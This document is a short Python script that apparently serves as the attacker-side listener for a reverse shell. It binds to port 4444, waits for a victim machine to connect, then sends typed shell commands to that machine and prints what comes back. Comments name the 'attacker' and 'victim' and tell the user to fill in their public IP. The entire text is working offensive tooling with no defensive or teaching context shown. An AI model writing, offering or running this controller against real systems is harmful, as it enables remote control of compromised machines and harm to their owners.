import socket

# Define the attacker's IP and port
attacker_ip = '0.0.0.0'  # Replace with your public IP
attacker_port = 4444

# Create a socket object
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the IP and port
server.bind((attacker_ip, attacker_port))

# Listen for a connection
server.listen(1)
print(f"[*] Listening on {attacker_ip}:{attacker_port}...")

# Accept a connection
client_socket, client_address = server.accept()
print(f"[*] Connection established from {client_address}")

# Receive commands from the victim
while True:
    command = input("Shell> ")
    if command.lower() == 'exit':
        client_socket.send(b'exit')
        client_socket.close()
        break

    # Send the command to the victim
    client_socket.send(command.encode())

    # Receive and print the response from the victim
    response = client_socket.recv(1024).decode()
    print(response)